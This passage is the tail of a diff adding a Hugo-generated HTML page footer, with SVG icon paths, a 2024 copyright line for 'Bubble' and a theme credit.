+		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
+		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
+		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
+		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
+		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
+		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
+		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
+</g>
+</svg>
+
+    </a>
+
+
+</div>
+
+    
+
+    <div class="copyright">
+    
+       © Copyright 
+       2024 
+       <span class="split">
+        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
+  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
+</svg>
+       </span>
+       Bubble
+    
+    </div>
+
+    
+      <div class="powerby">
+        Powered by <a href='http://www.gohugo.io/'>Hugo</a> Theme By <a href='https://github.com/nodejh/hugo-theme-mini'>nodejh</a>
+      </div>
+    
+</footer>
+
+
+
+  </body>
+</html>
